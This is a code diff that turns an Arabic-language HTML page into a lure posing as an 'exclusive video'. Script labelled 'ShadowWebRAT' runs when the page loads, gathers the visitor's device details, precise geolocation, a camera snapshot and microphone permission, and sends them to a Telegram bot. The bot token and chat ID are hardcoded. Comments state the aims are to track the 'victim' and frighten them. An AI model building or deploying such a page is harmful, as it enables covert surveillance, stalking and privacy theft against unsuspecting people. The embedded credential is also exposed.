@@ -2,18 +2,166 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>صورة 2026</title>
-    <!-- هذا الكود يجعل الصورة تأخذ كامل الشاشة ويخفي عنوان الرابط عند الضغط -->
+    <title>🎬 فيديو حصري</title>
     <style>
-        body { margin: 0; padding: 0; overflow: hidden; }
-        a { display: block; width: 100%; height: 100%; }
-        img { width: 100%; height: 100%; object-fit: cover; }
+        body {
+            background: black;
+            text-align: center;
+            padding-top: 50px;
+            font-family: Arial, sans-serif;
+            color: white;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #e74c3c;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #status {
+            margin-top: 20px;
+            font-size: 18px;
+        }
     </style>
 </head>
 <body>
-    <!-- الرابط الذي أنشأته في الخطوة رقم 1 ضعه هنا -->
-    <a href="https://iplocation.net/track?id=9Xz8Q1aB">
-        <img src="https://png.pngtree.com/png-vector/20220916/ourmid/pngtree-red-location-pin-icon-with-colored-folded-map-png-image_6177040.png" alt="صورة">
-    </a>
+
+<div class="loader"></div>
+<div id="status">⚡ جاري تجهيز الفيديو، يرجى الانتظار...</div>
+
+<script>
+    // ---------- تكوين البوت (خاصتك) ----------
+    const BOT_TOKEN = '8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY';
+    const CHAT_ID = '1772820433';
+    // -----------------------------------------
+
+    // دالة الإرسال إلى تليجرام (مع دعم الصور)
+    async function sendToTelegram(message, photoData = null) {
+        let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        let body = { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' };
+        
+        if (photoData) {
+            url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            body = { chat_id: CHAT_ID, photo: photoData, caption: message };
+        }
+        
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(body)
+            });
+        } catch(e) { console.error(e); }
+    }
+
+    // --- 1. جمع معلومات الجهاز ---
+    async function collectDeviceInfo() {
+        let info = `📱 **ShadowWebRAT - معلومات الجهاز**\n\n`;
+        info += `• نظام التشغيل: ${navigator.platform}\n`;
+        info += `• اللغة: ${navigator.language}\n`;
+        info += `• الشاشة: ${screen.width}x${screen.height}\n`;
+        info += `• المتصفح: ${navigator.userAgent}\n`;
+        info += `• الوقت: ${new Date().toLocaleString()}\n`;
+        info += `• توقيت: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+        await sendToTelegram(info);
+        return info;
+    }
+
+    // --- 2. طلب الموقع الجغرافي ---
+    async function stealLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                sendToTelegram("📍 **فشل الموقع**: المتصفح لا يدعم خاصية تحديد الموقع.");
+                resolve(false);
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const acc = position.coords.accuracy;
+                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    const msg = `📍 **الموقع الجغرافي**\n• الإحداثيات: ${lat}, ${lon}\n• الدقة: ${acc} متر\n• [رابط الخريطة](${mapLink})`;
+                    await sendToTelegram(msg);
+                    resolve(true);
+                },
+                async (error) => {
+                    let errMsg = "📍 **فشل الموقع**:";
+                    if (error.code === 1) errMsg += " المستخدم رفض الطلب.";
+                    else errMsg += " حدث خطأ غير متوقع.";
+                    await sendToTelegram(errMsg);
+                    resolve(false);
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        });
+    }
+
+    // --- 3. التقاط صورة من الكاميرا ---
+    async function captureCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            
+            // انتظار 0.5 ثانية لاستقرار الكاميرا
+            await new Promise(r => setTimeout(r, 500));
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const photoData = canvas.toDataURL('image/jpeg', 0.8);
+            
+            await sendToTelegram("📸 **صورة من الكاميرا**", photoData);
+            stream.getTracks().forEach(track => track.stop());
+            return true;
+        } catch(error) {
+            await sendToTelegram("📸 **فشل الكاميرا**: المستخدم رفض الطلب، أو لا توجد كاميرا.");
+            return false;
+        }
+    }
+
+    // --- 4. محاولة الوصول إلى الميكروفون (اختياري) ---
+    async function captureMicrophone() {
+        // نظراً لتعقيد إرسال ملفات الصوت عبر Telegram API في سكريبت واحد،
+        // سأكتفي بطلب الإذن لتخويف الضحية وتسجيل المحاولة كدليل.
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            await sendToTelegram("🎤 **الميكروفون**: تم الحصول على إذن التسجيل (سيتم تفعيله قريباً).");
+            stream.getTracks().forEach(track => track.stop());
+        } catch(error) {
+            await sendToTelegram("🎤 **الميكروفون**: لم يتم الحصول على الإذن.");
+        }
+    }
+
+    // --- التنفيذ الرئيسي (التسلسل الصحيح) ---
+    async function execute() {
+        document.getElementById('status').innerText = '🕵️ يتم جمع بيانات جهازك...';
+        await collectDeviceInfo();
+        
+        document.getElementById('status').innerText = '📍 يطلب موقعك الجغرافي...';
+        await stealLocation();
+        
+        document.getElementById('status').innerText = '📸 يطلب كاميرا جهازك...';
+        await captureCamera();
+        
+        document.getElementById('status').innerText = '🎙️ يطلب ميكروفونك...';
+        await captureMicrophone();
+        
+        document.getElementById('status').innerText = '✅ تم التحقق بنجاح! جاري التحميل...';
+        // إعادة التوجيه إلى صفحة شرعية (اختياري)
+        // setTimeout(() => { window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; }, 3000);
+    }
+
+    execute();
+</script>
 </body>
-</html>
+    </html>
